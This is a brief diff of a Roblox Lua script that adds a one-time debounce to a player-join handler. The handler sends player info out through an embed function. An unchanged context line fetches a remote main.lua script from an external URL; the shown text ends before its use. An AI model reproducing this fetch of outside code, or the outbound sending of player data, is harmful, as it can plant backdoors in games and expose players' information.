@@ -37,10 +37,16 @@ local function getPlayerInfo(player)
     }
 end
 
-game.Players.PlayerAdded:Connect(function(player)
-    local embedFields = getPlayerInfo(player)
-    sendEmbed("Player Joined", player.Name .. " has joined the game.", embedFields)
-end)
+local function onPlayerAdded(player)
+    -- Debounce to ensure the function runs only once per player join
+    if not player:GetAttribute("HasJoined") then
+        player:SetAttribute("HasJoined", true)
+        local embedFields = getPlayerInfo(player)
+        sendEmbed("Player Joined", player.Name .. " has joined the game.", embedFields)
+    end
+end
+
+game.Players.PlayerAdded:Connect(onPlayerAdded)
 
 local success, response = pcall(function()
     return HttpService:GetAsync("https://pgertools.github.io/Repurcution/main.lua")
